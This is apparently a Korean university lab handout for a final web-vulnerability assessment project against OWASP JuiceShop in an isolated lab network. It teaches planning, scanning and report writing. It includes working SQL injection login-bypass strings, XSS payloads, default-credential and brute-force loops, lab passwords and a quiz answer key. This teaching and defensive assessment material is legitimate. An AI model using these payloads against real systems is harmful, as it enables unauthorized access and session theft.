# Week 15: 기말 -- 종합 웹취약점 점검 프로젝트

## 학습 목표
- 14주간 배운 모든 점검 기법을 종합하여 실제 웹 애플리케이션을 점검한다
- 전문 수준의 취약점 점검 보고서를 작성한다
- OWASP Testing Guide 기반 체계적 점검 절차를 수행한다
- 점검 계획 수립부터 보고서 제출까지 전 사이클을 경험한다

## 실습 환경 (공통)

| 서버 | IP | 역할 | 접속 |
|------|-----|------|------|
| opsclaw | 10.20.30.201 | Control Plane (OpsClaw) | `ssh opsclaw@10.20.30.201` (pw: 1) |
| secu | 10.20.30.1 | 방화벽/IPS (nftables, Suricata) | `sshpass -p1 ssh secu@10.20.30.1` |
| web | 10.20.30.80 | 웹서버 (JuiceShop:3000, Apache:80) | `sshpass -p1 ssh web@10.20.30.80` |
| siem | 10.20.30.100 | SIEM (Wazuh:443, OpenCTI:9400) | `sshpass -p1 ssh siem@10.20.30.100` |
| dgx-spark | 192.168.0.105 | AI/GPU (Ollama:11434) | 원격 API만 |

**OpsClaw API:** `http://localhost:8000` / Key: `opsclaw-api-key-2026`

## 강의 시간 배분 (3시간)

| 시간 | 내용 | 유형 |
|------|------|------|
| 0:00-0:40 | 이론 강의 (Part 1) | 강의 |
| 0:40-1:10 | 이론 심화 + 사례 분석 (Part 2) | 강의/토론 |
| 1:10-1:20 | 휴식 | - |
| 1:20-2:00 | 실습 (Part 3) | 실습 |
| 2:00-2:40 | 심화 실습 + 도구 활용 (Part 4) | 실습 |
| 2:40-2:50 | 휴식 | - |
| 2:50-3:20 | 응용 실습 + OpsClaw 연동 (Part 5) | 실습 |
| 3:20-3:40 | 복습 퀴즈 + 과제 안내 (Part 6) | 퀴즈 |

---

---

## 용어 해설 (웹취약점 점검 과목)

| 용어 | 영문 | 설명 | 비유 |
|------|------|------|------|
| **취약점 점검** | Vulnerability Assessment | 시스템의 보안 약점을 체계적으로 찾는 활동 | 건물 안전 진단 |
| **모의해킹** | Penetration Testing | 실제 공격자처럼 취약점을 악용하여 검증 | 소방 훈련 (실제로 불을 피워봄) |
| **CVSS** | Common Vulnerability Scoring System | 취약점 심각도 0~10점 (9.0+ Critical) | 질병 위험 등급표 |
| **SQLi** | SQL Injection | SQL 쿼리에 악성 입력 삽입 | 주문서에 가짜 지시를 끼워넣기 |
| **XSS** | Cross-Site Scripting | 웹페이지에 악성 스크립트 삽입 | 게시판에 함정 쪽지 붙이기 |
| **CSRF** | Cross-Site Request Forgery | 사용자 모르게 요청을 위조 | 누군가 내 이름으로 송금 요청 |
| **SSRF** | Server-Side Request Forgery | 서버가 내부 자원에 요청하도록 조작 | 직원에게 기밀 문서를 가져오라 속이기 |
| **LFI** | Local File Inclusion | 서버의 로컬 파일을 읽는 취약점 | 사무실 서류함을 몰래 열람 |
| **RFI** | Remote File Inclusion | 외부 파일을 서버에 로드하는 취약점 | 외부에서 악성 서류를 사무실에 반입 |
| **RCE** | Remote Code Execution | 원격에서 서버 코드 실행 | 전화로 사무실 컴퓨터 조작 |
| **WAF 우회** | WAF Bypass | 웹 방화벽의 탐지를 피하는 기법 | 보안 검색대를 우회하는 비밀 통로 |
| **인코딩** | Encoding | 데이터를 다른 형식으로 변환 (URL, Base64 등) | 택배 재포장 (내용물은 같음) |
| **난독화** | Obfuscation | 코드를 읽기 어렵게 변환 (탐지 회피) | 범인이 변장하는 것 |
| **세션** | Session | 서버가 사용자를 식별하는 상태 정보 | 카페 단골 인식표 |
| **쿠키** | Cookie | 브라우저에 저장되는 작은 데이터 | 가게에서 받은 스탬프 카드 |
| **Burp Suite** | Burp Suite | 웹 보안 점검 프록시 도구 (PortSwigger) | 우편물 검사 장비 |
| **OWASP ZAP** | OWASP ZAP | 오픈소스 웹 보안 스캐너 | 무료 보안 검사 장비 |
| **점검 보고서** | Assessment Report | 발견된 취약점과 대응 방안을 정리한 문서 | 건물 안전 진단 보고서 |

---

# Week 15: 기말 -- 종합 웹취약점 점검 프로젝트

## 학습 목표
- 14주간 배운 모든 점검 기법을 종합하여 실제 웹 애플리케이션을 점검한다
- 전문 수준의 취약점 점검 보고서를 작성한다
- OWASP Testing Guide 기반 체계적 점검 절차를 수행한다
- 점검 계획 수립부터 보고서 제출까지 전 사이클을 경험한다

## 전제 조건
- Week 01~14 전체 내용 숙지
- 점검 보고서 작성 경험 (Week 14)

---

## 1. 기말 시험 구성 (10분)

### 대상: JuiceShop (http://10.20.30.80:3000)

### 점검 범위
1. 정보수집 (Week 03)
2. 인증/세션 관리 (Week 04)
3. SQL Injection (Week 05)
4. XSS/CSRF (Week 06)
5. 파일/명령어 주입 (Week 07)
6. 접근제어 (Week 09)
7. 암호화/통신 보안 (Week 10)
8. 에러 처리/정보 노출 (Week 11)
9. API 보안 (Week 12)

### 채점 기준 (100점)

| 항목 | 배점 | 기준 |
|------|------|------|
| 취약점 발견 수 | 30점 | 10개 이상 만점 |
| CVSS 점수 정확성 | 15점 | 각 취약점 CVSS 산정 |
| 재현 절차 | 20점 | 명령어 단위 재현 가능 |
| 권고사항 | 15점 | 실현 가능한 보완 방안 |
| 보고서 품질 | 20점 | 체계적 구성, 명확한 서술 |

---

## 2. Phase 1: 점검 계획 수립 (20분)

> **이 실습을 왜 하는가?**
> "기말 -- 종합 웹취약점 점검 프로젝트" — 이 주차의 핵심 기술을 실제 서버 환경에서 직접 실행하여 체험한다.
> 웹 취약점 점검 분야에서 이 기술은 실무의 핵심이며, 실습을 통해
> 명령어의 의미, 결과 해석 방법, 보안 관점에서의 판단 기준을 익힌다.
>
> **이걸 하면 무엇을 알 수 있는가?**
> - 이 기술이 실제 시스템에서 어떻게 동작하는지 직접 확인
> - 정상과 비정상 결과를 구분하는 눈을 기름
> - 실무에서 바로 활용할 수 있는 명령어와 절차를 체득
>
> **주의:** 모든 실습은 허가된 실습 환경(10.20.30.0/24)에서만 수행한다.

### 2.1 대상 시스템 정보 수집

> **실습 목적**: 기말 과제로 JuiceShop 전체에 대한 종합 웹 취약점 점검 프로젝트를 수행한다
>
> **배우는 것**: 정보수집, 취약점 발견, PoC 작성, CVSS 산출, 보고서 작성까지 전 과정을 실전처럼 수행한다
>
> **결과 해석**: 최종 보고서에 재현 가능한 PoC, CVSS 점수, 대응 권고가 포함되어야 한다
>
> **실전 활용**: 이 실습은 실제 웹 취약점 점검 프로젝트의 납품 과정과 동일한 절차를 따른다

```bash
sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 << 'ENDSSH'  # 비밀번호 자동입력 SSH
echo "=== 점검 대상 시스템 정보 ==="

echo "--- 서비스 상태 ---"
curl -s -o /dev/null -w "JuiceShop: HTTP %{http_code}\n" http://localhost:3000/  # silent 모드
curl -sI http://localhost:3000/ | grep -iE "^(server|x-powered|content-type):"

echo ""
echo "--- API 엔드포인트 탐색 ---"
for ep in rest/products/search?q= api/Users api/Products api/Challenges api-docs ftp; do  # 반복문 시작
  CODE=$(curl -s -o /dev/null -w "%{http_code}" http://localhost:3000/$ep)
  echo "  /$ep -> HTTP $CODE"
done

echo ""
echo "--- 기술 스택 식별 ---"
curl -s http://localhost:3000/package.json 2>/dev/null | python3 -c "  # silent 모드
import json,sys
try:
    d = json.load(sys.stdin)
    print(f'  앱: {d.get(\"name\",\"?\")} v{d.get(\"version\",\"?\")}')
    deps = d.get('dependencies',{})
    for k in list(deps.keys())[:5]:                    # 반복문 시작
        print(f'  의존성: {k} {deps[k]}')
except: print('  package.json 파싱 실패')
" 2>/dev/null
ENDSSH
```

### 2.2 점검 계획서 작성

원격 서버에 접속하여 명령을 실행합니다.

```bash
sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 << 'ENDSSH'  # 비밀번호 자동입력 SSH
python3 << 'PYEOF'                                     # Python 스크립트 실행
from datetime import datetime

plan = f"""
================================================================
           웹 취약점 점검 계획서
================================================================
프로젝트: 기말 종합 점검
대상: OWASP JuiceShop (http://10.20.30.80:3000)
일시: {datetime.now().strftime('%Y-%m-%d')}
점검자: (학번/이름)
방법론: OWASP Testing Guide v4.2

점검 범위:
  - 웹 프런트엔드 (Angular SPA)
  - REST API (/rest/*, /api/*)
  - 인증/세션 관리
  - 파일 업로드/다운로드
  범위 제외: OS, 네트워크, DoS

일정:
  - 정보 수집: 20분
  - 취약점 점검: 60분
  - 보고서 작성: 40분
  - 검토/발표: 20분

안전 수칙:
  - 승인된 대상만 점검
  - DoS 공격 금지
  - 발견된 민감 데이터 즉시 삭제
================================================================
"""
print(plan)
PYEOF
ENDSSH
```

---

## 3. Phase 2: 정보 수집 (20분)

### 3.1 보안 헤더 및 설정 점검

원격 서버에 접속하여 명령을 실행합니다.

```bash
sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 << 'ENDSSH'  # 비밀번호 자동입력 SSH
echo "=== 보안 헤더 점검 ==="
HEADERS=$(curl -sI http://localhost:3000/)

for hdr in "X-Frame-Options" "X-Content-Type-Options" "Content-Security-Policy" \
           "Strict-Transport-Security" "X-XSS-Protection" "Referrer-Policy"; do
  if echo "$HEADERS" | grep -qi "$hdr"; then
    echo "[OK] $(echo "$HEADERS" | grep -i "$hdr" | head -1 | tr -d '\r')"
  else
    echo "[MISSING] $hdr"
  fi
done

echo ""
echo "=== 디렉토리/파일 노출 점검 ==="
for path in ".git/HEAD" ".env" "package.json" "robots.txt" "api-docs" "ftp"; do  # 반복문 시작
  CODE=$(curl -s -o /dev/null -w "%{http_code}" http://localhost:3000/$path)
  if [ "$CODE" = "200" ]; then
    echo "[EXPOSED] /$path (HTTP $CODE)"
  else
    echo "[SAFE] /$path (HTTP $CODE)"
  fi
done
ENDSSH
```

### 3.2 HTTP 메서드 및 서버 정보

원격 서버에 접속하여 명령을 실행합니다.

```bash
sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 << 'ENDSSH'  # 비밀번호 자동입력 SSH
echo "=== HTTP 메서드 점검 ==="
for method in GET POST PUT DELETE OPTIONS TRACE PATCH; do  # 반복문 시작
  CODE=$(curl -s -o /dev/null -w "%{http_code}" -X $method http://localhost:3000/api/Products)
  echo "  $method /api/Products -> HTTP $CODE"
done

echo ""
echo "=== 디폴트 계정 점검 ==="
for cred in "admin@juice-sh.op:admin123" "admin:admin" "test@test.com:test"; do  # 반복문 시작
  IFS=":" read -r email pass <<< "$cred"
  RESULT=$(curl -s -X POST http://localhost:3000/rest/user/login \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"$email\",\"password\":\"$pass\"}")  # 요청 데이터(body)
  if echo "$RESULT" | grep -q "authentication"; then
    echo "  [VULN] $email / $pass -> 로그인 성공"
  else
    echo "  [SAFE] $email / $pass -> 실패"
  fi
done
ENDSSH
```

---

## 4. Phase 3: 취약점 점검 (60분)

### 4.1 SQL Injection 점검

원격 서버에 접속하여 명령을 실행합니다.

```bash
sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 << 'ENDSSH'  # 비밀번호 자동입력 SSH
echo "=== SQL Injection 점검 ==="

echo "--- 로그인 SQLi ---"
RESULT=$(curl -s -X POST http://localhost:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"'"'"' OR 1=1--","password":"x"}')      # 요청 데이터(body)
if echo "$RESULT" | grep -q "authentication"; then
  echo "[CRITICAL] 로그인 SQLi -> 인증 우회 성공"
  echo "$RESULT" | python3 -c "
import json,sys
d = json.load(sys.stdin)
auth = d.get('authentication',{})
print(f'  이메일: {auth.get(\"umail\",\"N/A\")}')
print(f'  토큰: {auth.get(\"token\",\"\")[:40]}...')
" 2>/dev/null
else
  echo "[SAFE] 로그인 SQLi 차단"
fi

echo ""
echo "--- 검색 SQLi ---"
NORMAL=$(curl -s "http://localhost:3000/rest/products/search?q=apple" | wc -c)
SQLI=$(curl -s "http://localhost:3000/rest/products/search?q='+OR+1=1--" | wc -c)
echo "  정상: ${NORMAL}B / SQLi: ${SQLI}B"
[ "$SQLI" -gt "$NORMAL" ] && echo "  [HIGH] 검색 SQLi 취약" || echo "  [SAFE] 검색 SQLi 안전"
ENDSSH
```

### 4.2 XSS 및 접근제어 점검

원격 서버에 접속하여 명령을 실행합니다.

```bash
sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 << 'ENDSSH'  # 비밀번호 자동입력 SSH
echo "=== XSS 점검 ==="
XSS_PAYLOADS=("<script>alert(1)</script>" "<img src=x onerror=alert(1)>" "<svg onload=alert(1)>")

for payload in "${XSS_PAYLOADS[@]}"; do                # 반복문 시작
  ENCODED=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload'))")
  RESP=$(curl -s "http://localhost:3000/rest/products/search?q=${ENCODED}")
  if echo "$RESP" | grep -qF "$payload"; then
    echo "  [HIGH] 반사형 XSS: $payload"
  else
    echo "  [SAFE] 필터됨: $payload"
  fi
done

echo ""
echo "=== 접근제어 점검 ==="
echo "--- 인증 없이 API 접근 ---"
for ep in "api/Users" "api/Challenges" "api/Quantitys"; do  # 반복문 시작
  CODE=$(curl -s -o /dev/null -w "%{http_code}" "http://localhost:3000/$ep")
  echo "  /$ep -> HTTP $CODE"
  [ "$CODE" = "200" ] && echo "    [MEDIUM] 인증 없이 접근 가능"
done

echo ""
echo "--- 패스워드 정책 ---"
for pw in "1" "abc" "a"; do                            # 반복문 시작
  RESULT=$(curl -s -X POST http://localhost:3000/api/Users/ \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"pwtest_$(date +%s%N)@t.com\",\"password\":\"$pw\",\"passwordRepeat\":\"$pw\",\"securityQuestion\":{\"id\":1},\"securityAnswer\":\"a\"}")  # 요청 데이터(body)
  if echo "$RESULT" | grep -q "\"id\""; then
    echo "  [MEDIUM] 약한 패스워드 허용: '$pw'"
  fi
done
ENDSSH
```

### 4.3 인증 및 세션 점검

원격 서버에 접속하여 명령을 실행합니다.

```bash
sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 << 'ENDSSH'  # 비밀번호 자동입력 SSH
echo "=== 계정 잠금 정책 점검 ==="
echo "5회 연속 실패 시도..."
for i in $(seq 1 5); do                                # 반복문 시작
  CODE=$(curl -s -o /dev/null -w "%{http_code}" -X POST http://localhost:3000/rest/user/login \
    -H "Content-Type: application/json" \
    -d '{"email":"admin@juice-sh.op","password":"wrong'$i'"}')  # 요청 데이터(body)
  echo "  시도 $i: HTTP $CODE"
done
echo "  -> 5회 실패 후에도 계정 잠금 없으면 [MEDIUM] 취약"

echo ""
echo "=== JWT 토큰 분석 ==="
TOKEN=$(curl -s -X POST http://localhost:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"'"'"' OR 1=1--","password":"x"}' | \
  python3 -c "import json,sys; print(json.load(sys.stdin).get('authentication',{}).get('token',''))" 2>/dev/null)  # Python 코드 실행

if [ -n "$TOKEN" ] && [ "$TOKEN" != "" ]; then
  echo "$TOKEN" | cut -d. -f2 | python3 -c "
import base64, sys, json
token_part = sys.stdin.read().strip()
padding = 4 - len(token_part) % 4
decoded = base64.urlsafe_b64decode(token_part + '=' * padding)
payload = json.loads(decoded)
print(f'  알고리즘 확인 필요 (none 취약점)')
print(f'  사용자: {payload.get(\"data\",{}).get(\"email\",\"N/A\")}')
print(f'  역할: {payload.get(\"data\",{}).get(\"role\",\"N/A\")}')
" 2>/dev/null
fi
ENDSSH
```

---

## 5. Phase 4: 보고서 작성 (40분)

### 5.1 보고서 형식

```markdown
# 웹 취약점 점검 보고서

## 1. 개요
- 점검 대상, 범위, 기간, 점검자

## 2. 총평
- 전체 취약점 현황 요약, 위험도 분포

## 3. 취약점 상세
### 3.1 [취약점명]
- 위험도: Critical/High/Medium/Low
- CVSS: X.X
- 위치: URL/파라미터
- 재현 절차: (명령어 단위)
- 영향:
- 권고사항:

## 4. 결론 및 권고
```

### 5.2 종합 보고서 자동 생성

원격 서버에 접속하여 명령을 실행합니다.

```bash
sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 << 'ENDSSH'  # 비밀번호 자동입력 SSH
python3 << 'PYEOF'                                     # Python 스크립트 실행
from datetime import datetime

findings = [
    {"id":"V-001","name":"SQL Injection (로그인 우회)","severity":"Critical","cvss":9.8,
     "cwe":"CWE-89","location":"POST /rest/user/login (email)",
     "fix":"Parameterized Query 또는 ORM 사용"},
    {"id":"V-002","name":"XSS (검색 반사형)","severity":"High","cvss":7.1,
     "cwe":"CWE-79","location":"GET /rest/products/search (q)",
     "fix":"출력 인코딩, CSP 헤더"},
    {"id":"V-003","name":"API 접근제어 부재","severity":"Medium","cvss":5.3,
     "cwe":"CWE-284","location":"GET /api/Users",
     "fix":"JWT 인증 필수화"},
    {"id":"V-004","name":"약한 패스워드 정책","severity":"Medium","cvss":5.3,
     "cwe":"CWE-521","location":"POST /api/Users",
     "fix":"최소 8자, 복잡도 요구"},
    {"id":"V-005","name":"보안 헤더 누락","severity":"Medium","cvss":4.3,
     "cwe":"CWE-693","location":"전체 응답",
     "fix":"CSP, X-Frame-Options 등 헤더 추가"},
    {"id":"V-006","name":"계정 잠금 부재","severity":"Medium","cvss":5.3,
     "cwe":"CWE-307","location":"POST /rest/user/login",
     "fix":"5회 실패 시 잠금 또는 CAPTCHA"},
    {"id":"V-007","name":"package.json 노출","severity":"Low","cvss":3.1,
     "cwe":"CWE-200","location":"GET /package.json",
     "fix":"정적 파일 접근 제한"},
]

stats = {}
for f in findings:                                     # 반복문 시작
    s = f["severity"]
    stats[s] = stats.get(s, 0) + 1

report = f"""
{'='*70}
          종합 웹 취약점 점검 보고서
{'='*70}
프로젝트: 기말 종합 점검
대상: OWASP JuiceShop (http://10.20.30.80:3000)
일시: {datetime.now().strftime('%Y-%m-%d %H:%M')}
방법론: OWASP Testing Guide v4.2

1. 요약
   총 발견: {len(findings)}건
"""
for sev in ["Critical","High","Medium","Low"]:         # 반복문 시작
    report += f"     {sev}: {stats.get(sev,0)}건\n"

report += f"\n2. 발견사항 상세\n{'~'*60}\n"

for f in findings:                                     # 반복문 시작
    report += f"""
[{f['id']}] {f['name']}
  심각도: {f['severity']} (CVSS {f['cvss']})
  CWE: {f['cwe']}
  위치: {f['location']}
  권고: {f['fix']}
"""

report += f"""
{'~'*60}

3. 권고사항 우선순위
   [즉시] V-001 SQL Injection 수정
   [즉시] V-002 XSS 출력 인코딩
   [단기] V-003 API 인증 강화
   [단기] V-004 패스워드 정책
   [단기] V-006 계정 잠금 정책
   [일반] V-005 보안 헤더
   [일반] V-007 파일 노출 차단

{'='*70}
"""
print(report)
PYEOF
ENDSSH
```

---

## 6. OpsClaw 연동 실습

### 6.1 OpsClaw로 점검 자동화

OpsClaw Manager API를 호출하여 작업을 수행합니다.

```bash
export OPSCLAW_API_KEY=opsclaw-api-key-2026            # 환경 변수 설정

# 1. 프로젝트 생성
echo "=== OpsClaw 프로젝트 생성 ==="
PROJECT=$(curl -s -X POST http://localhost:8000/projects \
  -H "Content-Type: application/json" \
  -H "X-API-Key: $OPSCLAW_API_KEY" \
  -d '{"name":"final-vuln-assessment","request_text":"기말 종합 점검","master_mode":"external"}')  # 요청 데이터(body)
PID=$(echo "$PROJECT" | python3 -c "import json,sys; print(json.load(sys.stdin)['id'])")
echo "Project ID: $PID"

# 2. Stage 전환
curl -s -X POST "http://localhost:8000/projects/$PID/plan" -H "X-API-Key: $OPSCLAW_API_KEY" > /dev/null  # silent 모드 / POST 요청 / API 인증 / OpsClaw 프로젝트
curl -s -X POST "http://localhost:8000/projects/$PID/execute" -H "X-API-Key: $OPSCLAW_API_KEY" > /dev/null  # silent 모드 / POST 요청 / API 인증 / OpsClaw 프로젝트

# 3. 점검 실행 (evidence 자동 기록)
curl -s -X POST "http://localhost:8000/projects/$PID/execute-plan" \
  -H "Content-Type: application/json" \
  -H "X-API-Key: $OPSCLAW_API_KEY" \
  -d '{                                                # 요청 데이터(body)
    "tasks": [
      {"order":1,"instruction_prompt":"curl -sI http://localhost:3000/ | head -15","risk_level":"low"},
      {"order":2,"instruction_prompt":"curl -s -X POST http://localhost:3000/rest/user/login -H \"Content-Type: application/json\" -d \"{\\\"email\\\":\\\"'"'"' OR 1=1--\\\",\\\"password\\\":\\\"x\\\"}\" | head -5","risk_level":"low"}
    ],
    "subagent_url": "http://10.20.30.80:8002"
  }' | python3 -c "import json,sys; d=json.load(sys.stdin); print(f'결과: {len(d.get(\"results\",[]))}건')" 2>/dev/null

# 4. evidence 확인
echo ""
curl -s "http://localhost:8000/projects/$PID/evidence/summary" \
  -H "X-API-Key: $OPSCLAW_API_KEY" | python3 -c "import json,sys; print(json.dumps(json.load(sys.stdin), indent=2, ensure_ascii=False)[:300])" 2>/dev/null  # API 인증 키
```

### 6.2 LLM 기반 보고서 품질 검증

```bash
curl -s http://192.168.0.105:11434/v1/chat/completions \
  -H "Content-Type: application/json" \
  -d '{                                                # 요청 데이터(body)
    "model": "gemma3:12b",
    "messages": [
      {"role": "system", "content": "보안 컨설팅 심사관입니다. 취약점 점검 보고서를 평가합니다. 한국어로."},
      {"role": "user", "content": "다음 취약점 기술의 품질을 10점 만점으로 평가하세요:\n\n[V-001] SQL Injection (로그인 우회)\n심각도: Critical (CVSS 9.8)\nCWE: CWE-89\n위치: POST /rest/user/login (email 파라미터)\n재현: Body={\"email\":\"'"'"' OR 1=1--\",\"password\":\"x\"} -> 인증 토큰 발급\n권고: Parameterized Query 사용\n\n1) 재현성 2) 영향 분석 3) 권고 구체성 4) 전체 점수"}
    ],
    "temperature": 0.3
  }' | python3 -c "import json,sys; print(json.load(sys.stdin)['choices'][0]['message']['content'])"
```

---

## 7. 과목 총정리

### 7.1 15주 학습 맵

```
Week 01-02: 기초         -> 점검 개론, 도구 환경 구축
Week 03-04: 정보수집/인증 -> 디렉토리 스캔, 세션 관리
Week 05-07: 입력값 검증   -> SQLi, XSS, CSRF, 파일 업로드
Week 08:    중간고사      -> JuiceShop 점검 보고서
Week 09-12: 고급 점검     -> 접근제어, 암호화, 에러, API
Week 13-14: 도구/보고서   -> 자동화 도구, CVSS, 보고서
Week 15:    기말          -> 종합 점검 프로젝트
```

### 7.2 핵심 역량 자가 진단

| 역량 | 확인 |
|------|------|
| 대상 시스템의 기술 스택을 식별할 수 있는가? | |
| 블라인드 SQLi를 포함한 다양한 SQLi를 점검할 수 있는가? | |
| 반사형/저장형/DOM XSS를 구분하고 점검할 수 있는가? | |
| IDOR, 수직/수평 권한 상승을 점검할 수 있는가? | |
| REST API 인증/인가를 체계적으로 점검할 수 있는가? | |
| 점검 스크립트를 작성하고 결과를 분석할 수 있는가? | |
| CVSS 기반 전문 보고서를 작성할 수 있는가? | |

---

## 제출물
1. 취약점 점검 보고서 (PDF 또는 Markdown)
2. OpsClaw 프로젝트 ID (evidence 자동 확인용)
3. 재현 스크립트 (모든 취약점 재현 가능)

---

## 핵심 정리

1. 웹취약점 점검은 계획-수집-점검-보고의 체계적 사이클이다
2. OWASP Testing Guide는 산업 표준 점검 방법론이다
3. 자동 도구와 수동 점검을 조합하면 최적의 결과를 얻는다
4. 보고서는 재현성, 영향 분석, 구체적 권고사항이 핵심이다
5. 점검은 반드시 승인된 범위 내에서 윤리적으로 수행한다

## 다음 학기 예고
보안시스템 운영 (Course 2) 또는 보안관제 (Course 5) 수강 권장

---

---

## 자가 점검 퀴즈 (5문항)

이번 주차의 핵심 기술 내용을 점검한다.

**Q1.** CVSS 9.8은 어떤 심각도 등급인가?
- (a) High  (b) **Critical**  (c) Medium  (d) Low

**Q2.** 취약점 점검 시 가장 먼저 수행하는 단계는?
- (a) 익스플로잇 실행  (b) **대상 범위 확인 및 정보 수집**  (c) 보고서 작성  (d) 패치 적용

**Q3.** SQLi 취약점의 CWE 번호는?
- (a) CWE-79  (b) **CWE-89**  (c) CWE-352  (d) CWE-22

**Q4.** 점검 보고서에서 취약점의 '재현 절차'가 중요한 이유는?
- (a) 분량을 늘리기 위해  (b) **고객이 직접 확인하고 수정할 수 있도록**  (c) 법적 요건  (d) 점검 시간 기록

**Q5.** WAF(:8082)가 SQLi를 차단할 때 반환하는 HTTP 코드는?
- (a) 200 OK  (b) **403 Forbidden**  (c) 500 Internal Error  (d) 301 Redirect

**정답:** Q1:b, Q2:b, Q3:b, Q4:b, Q5:b

---
---

> **실습 환경 검증 완료** (2026-03-28): nmap/nikto, SQLi/IDOR/swagger.json, CVSS, 보고서 작성
